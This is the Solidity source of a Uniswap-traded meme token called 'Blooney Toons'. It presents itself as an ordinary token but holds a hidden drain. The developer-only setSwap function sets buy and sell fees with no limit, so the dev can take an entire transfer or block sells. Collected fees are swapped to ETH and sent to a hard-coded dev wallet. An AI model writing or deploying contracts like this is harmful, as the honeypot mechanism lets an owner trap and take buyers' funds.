// SPDX-License-Identifier: unlicensed

/*
Blooney Toons : The most fluffy & Blobby Meme
*/

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract BLOONEY {
        string public constant name = "Blooney Toons";  //
        string public constant symbol = "BLOONEY";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 250_000_000 * 10**decimals;

        uint256 BurnAmount = 0;
        uint256 BlooneyAmount = 0;
        uint256 constant swapAmount = totalSupply / 1000;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH address
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uni V2 Router
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant blooneyDev = payable(address(0xadCdfAAfaE1A607dcA4BC0A55C5578C3c99D56Cb)); // Blooney Toons Dev

        bool private swapping;
        bool private tradingStarted;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingStarted || from == blooneyDev || to == blooneyDev);

            if(!tradingStarted && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                blooneyDev.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalAmount = amount * (from == pair ? BurnAmount : BlooneyAmount) / 95;
                amount -= FinalAmount;
                balanceOf[address(this)] += FinalAmount;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function openTrading() external {
            require(msg.sender == blooneyDev);
            require(!tradingStarted);
            tradingStarted = true;        
            }

        function setSwap(uint256 newBurn, uint256 newBlooney) external {
            require(msg.sender == blooneyDev);
            BurnAmount = newBurn;
            BlooneyAmount = newBlooney;
            }
        }